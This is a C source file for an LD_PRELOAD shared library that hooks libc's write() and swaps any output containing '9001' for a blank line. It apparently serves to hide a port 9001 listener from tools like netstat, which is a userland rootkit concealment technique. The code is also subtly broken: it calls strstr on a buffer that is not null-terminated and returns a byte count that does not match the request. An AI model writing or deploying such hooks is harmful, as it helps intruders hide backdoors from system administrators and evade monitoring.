#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// Function pointer to the original write function
ssize_t (*original_write)(int fd, const void *buf, size_t count);

// Override the write function
ssize_t write(int fd, const void *buf, size_t count) {
    // Load the original write function if not loaded
    if (!original_write) {
        original_write = dlsym(RTLD_NEXT, "write");
        if (!original_write) {
            fprintf(stderr, "Error: Unable to load original write function\n");
            return -1;
        }
    }

    // Convert the buffer to a string for comparison
    char *buffer_str = (char *)buf;

    // Check if the buffer contains the specified content
    if (strstr(buffer_str, "9001") != NULL) {
        // If the content is found, skip by writing an empty line
        const char *empty_line = "\n";
        return original_write(fd, empty_line, 1);
    }

    // Call the original write function for other cases
    return original_write(fd, buf, count);
}
